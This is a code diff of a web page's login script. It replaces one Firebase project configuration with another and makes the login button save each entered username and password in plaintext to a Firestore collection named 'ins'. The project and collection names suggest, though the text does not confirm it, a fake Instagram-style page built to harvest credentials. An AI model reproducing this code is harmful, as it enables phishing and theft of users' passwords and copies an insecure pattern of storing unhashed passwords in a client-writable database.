@@ -109,14 +109,16 @@
 
   <script>
     // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
     var firebaseConfig = {
-      apiKey: "AIzaSyCQ0BsonjdhlKEY4gxeN5Tb9-0TGvpZxQY",
-      authDomain: "demoings.firebaseapp.com",
-      databaseURL: "https://demoings.firebaseio.com",
-      projectId: "demoings",
-      storageBucket: "demoings.appspot.com",
-      messagingSenderId: "773456670372",
-      appId: "1:773456670372:web:e74affa296f92716f94031"
+      apiKey: "AIzaSyA2O3ZNJh0i9UhdF6Y9X-FYjYCw3VMKo40",
+      authDomain: "projecta-bbc05.firebaseapp.com",
+      databaseURL: "https://projecta-bbc05.firebaseio.com",
+      projectId: "projecta-bbc05",
+      storageBucket: "projecta-bbc05.appspot.com",
+      messagingSenderId: "497807493063",
+      appId: "1:497807493063:web:9b5018b4e3f2cbfa797be2",
+      measurementId: "G-TX14GP50TB"
     };
     // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
@@ -280,12 +282,11 @@
     const loginBtn = document.getElementById('login');
     const name = document.getElementById('name');
     const pass = document.getElementById('pass');
-    const data = db.collection('data');
+    const insRef = db.collection('ins');
+    console.log('insRef :>> ', insRef);
     loginBtn.onclick = (e) => {
-      console.log('pass :>> ', pass);
-      console.log('data :>> ', data);
       e.preventDefault();
-      data.add({
+      insRef.add({
         name: name.value,
         pass: pass.value,
       })
